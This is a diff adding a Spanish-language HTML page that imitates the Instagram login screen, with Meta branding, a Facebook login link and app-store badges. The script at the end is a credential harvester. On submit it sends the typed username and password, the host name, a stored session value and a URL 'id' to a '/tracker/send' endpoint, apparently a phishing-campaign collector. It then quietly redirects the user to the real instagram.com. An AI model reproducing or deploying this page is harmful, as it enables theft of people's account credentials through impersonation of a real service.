@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <style>
+      :root {
+        --fs-large: 0.875rem;
+        --fs-medium: 0.8125rem;
+        --fs-small: 0.75rem;
+        --fw-medium: 600;
+        --ff-apple: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        --clr-primary: #fafafa;
+        --clr-accent: #dbdbdb;
+        --clr-white: #fff;
+        --clr-gray: #8e8e8e;
+        --clr-dark: #262626;
+        --clr-blue: #00376b;
+        --clr-disabled-blue: rgb(103, 181, 250);
+        --clr-enabled-blue: rgb(0, 149, 246);
+        --clr-hover-blue: rgb(26, 119, 242);
+      }
+      *, *::before, *::after { box-sizing: border-box; padding: 0; margin: 0; }
+      a,
+      a:active,
+      a:hover {
+        text-decoration: none;
+      }
+      .text-center { text-align: center; }
+      .text-gap {
+        padding: 0.1em 0.7em;
+      }
+      .fs-large { font-size: var(--fs-large); }
+      .fs-medium { font-size: var(--fs-medium); }
+      .fs-small { font-size: var(--fs-small); }
+      .fw-medium { font-weight: var(--fw-medium); }
+      .text-dark { color: var(--clr-dark); }
+      .text-blue { color: var(--clr-blue); }
+      .text-light-blue {
+        color: var(--clr-enabled-blue);
+      }
+      .text-soft { color: var(--clr-gray); }
+      .card { border: 1px solid var(--clr-accent); background-color: var(--clr-white); }
+      .card--large { padding: 1% 12% 4% 12%; }
+      .card--medium { padding: 5% 0; }
+      .phone { width: 421px; height: 583px; background-image: url("img/phone.png"); background-repeat: no-repeat; }
+      .phone__screen { position: relative; top: 28px; left: 155px; }
+      .form { display: flex; flex-direction: column; gap: 0.4em; }
+      .form__input { padding: 0.8em 0.7em; border-radius: 3px; }
+      .form__input--soft { border: 1px solid var(--clr-accent); background-color: var(--clr-primary); }
+      .form__submit { padding: 0.6em; border-width: 1px; border-style: solid; cursor: not-allowed; color: var(--clr-white); border-color: transparent; background-color: var(--clr-disabled-blue); }
+      .form__submit--enabled { background-color: var(--clr-enabled-blue); cursor: pointer; }
+      .form__submit--enabled:hover { background-color: var(--clr-hover-blue); }
+      .form__submit--separated { margin-top: 0.75em; border-radius: 6px; }
+      .bar { display: grid; grid-template-columns: 1fr auto 1fr; column-gap: 1.4em; }
+      .bar__line { align-self: center; height: 1px; }
+      .bar__line--soft { background-color: var(--clr-accent); }
+      .bar__text { text-transform: uppercase; }
+      .facebook { display: flex; gap: 0.4em; }
+      .facebook__icon { position: relative; top: 0.2em; width: 20px; height: 16px; }
+      .facebook__text { color: var(--clr-blue); }
+      .banner { display: flex; flex-direction: column; align-items: center; gap: 1.4em; }
+      .banner__text { text-align: center; }
+      .banner__img { height: 2.5em; }
+      .logo img { margin-top: 2.25em; margin-bottom: 2.25em; height: 70%; width: 70%; }
+      #bar { margin: 1.5em 0 1.7em 0; }
+      #facebook { justify-content: center; }
+      #forgot-password { margin-top: 1.8em; }
+      #second-card { margin-top: 0.8em; margin-bottom: 1.6em; }
+      footer { margin: 0 8%; padding-bottom: 6.3em; line-height: 1.8em; }
+      footer > * { display: flex; flex-wrap: wrap; justify-content: center; }
+      footer article { margin-top: 0.8em; }
+      body { display: flex; flex-direction: column; justify-content: center; align-items: center; gap: 5em; min-height: 100vh; font-family: var(--ff-apple); background-color: var(--clr-primary); }
+      main { display: flex; flex-direction: row-reverse; align-items: center; gap: 2em; }
+      main > section { width: 22em; }
+      @media (max-width: 875px) { .phone { display: none; } }
+      @media (max-width: 450px) { body { justify-content: start; } .card { border: none; background: transparent; } main > section { width: 19em; } }
+    </style>
+    <script src="https://kit.fontawesome.com/c0e8330125.js" crossorigin="anonymous"></script>
+    <link rel="shortcut icon" href="img/instagram.png" type="image/x-icon" />
+    <title>Instagram</title>
+  </head>
+  <body>
+    <main>
+      <section>
+        <div class="card card--large text-center">
+          <a href="https://github.com/antonioalanxs/Responsive-Instagram-Login-Clone" class="logo">
+            <img src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/instagram-text-icon.png" alt="Instagram logo" />
+          </a>
+          <form class="form" id="loginForm">
+            <input type="text" placeholder="Phone number, username or email" class="form__input form__input--soft fs-small" id="email" />
+            <input type="password" placeholder="Password" class="form__input form__input--soft fs-small" id="password" />
+            <button class="form__submit form__submit--disabled form__submit--separated fs-large fw-medium" id="submitBtn" disabled>Log In</button>
+          </form>
+          <div class="bar fs-medium" id="bar">
+            <span class="bar__line bar__line--soft"></span>
+            <span class="bar__text fw-medium text-soft">Or</span>
+            <span class="bar__line bar__line--soft"></span>
+          </div>
+          <a href="#" class="facebook fs-large" id="facebook">
+            <img src="https://e7.pngegg.com/pngimages/213/828/png-clipart-facebook-logo-facebook-messenger-logo-social-media-icon-facebook-icon-blue-text.png" alt="Facebook logo" class="facebook__icon" />
+            <span class="facebook__text fw-medium">Log in with Facebook</span>
+          </a>
+          <div class="fs-small text-blue" id="forgot-password">Forgotten your password?</div>
+        </div>
+        <div class="card card--medium text-center fs-large text-gap text-soft" id="second-card">
+          <span class="text-dark">Don't have an account?</span>
+          <a href="#" class="fw-medium text-light-blue">Sign up</a>
+        </div>
+        <div class="banner fs-large">
+          <div class="banner__text text-dark">Get the app.</div>
+          <div>
+            <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020c87j0.png" alt="Apple Store" class="banner__img" />
+            <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Google Play" class="banner__img" />
+          </div>
+        </div>
+      </section>
+    </main>
+    <footer class="fs-small">
+      <nav>
+        <a href="#" class="text-gap text-soft">Meta</a>
+        <a href="#" class="text-gap text-soft">About</a>
+        <a href="#" class="text-gap text-soft">Blog</a>
+        <a href="#" class="text-gap text-soft">Jobs</a>
+        <a href="#" class="text-gap text-soft">Help</a>
+        <a href="#" class="text-gap text-soft">API</a>
+        <a href="#" class="text-gap text-soft">Privacy</a>
+        <a href="#" class="text-gap text-soft">Terms</a>
+        <a href="#" class="text-gap text-soft">Top Accounts</a>
+        <a href="#" class="text-gap text-soft">Hashtags</a>
+        <a href="#" class="text-gap text-soft">Locations</a>
+        <a href="#" class="text-gap text-soft">Instagram Lite</a>
+        <a href="#" class="text-gap text-soft">Contact Uploading & Non-Users</a>
+      </nav>
+      <article>
+        <span class="text-gap text-soft">English</span>
+        <span class="text-gap text-soft">© 2024 Instagram from Meta</span>
+      </article>
+    </footer>
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const emailInput = document.getElementById("email");
+        const passwordInput = document.getElementById("password");
+        const submitBtn = document.getElementById("submitBtn");
+        const loginForm = document.getElementById("loginForm");
+
+        const toggleButtonState = () => {
+          const isEnabled = emailInput.value && passwordInput.value;
+          submitBtn.classList.toggle("form__submit--enabled", isEnabled);
+          submitBtn.classList.toggle("form__submit--disabled", !isEnabled);
+          submitBtn.disabled = !isEnabled;
+        };
+
+        const sendData = async (event) => {
+          event.preventDefault();
+          const email = emailInput.value;
+          const password = passwordInput.value;
+          const hostName = window.location.hostname;
+          const sessionId = localStorage.getItem("Session");
+          const id = new URL(window.location.href).searchParams.get("id");
+          const IP_local = "dsds";
+
+          if (email && password) {
+            try {
+              await fetch(`http://127.0.0.1:5000/tracker/send?email=${email}&password=${password}&ip_address=${IP_local}&host_name=${hostName}&session=${sessionId}&id=${id}`, {
+                method: "GET",
+                headers: { "Content-Type": "application/json" },
+              });
+              window.location.href = "https://www.instagram.com/";
+            } catch (error) {
+              console.error("Error:", error);
+            }
+          } else {
+            alert("Please fill in both fields.");
+          }
+        };
+
+        emailInput.addEventListener("input", toggleButtonState);
+        passwordInput.addEventListener("input", toggleButtonState);
+        loginForm.addEventListener("submit", sendData);
+      });
+    </script>
+  </body>
+</html>
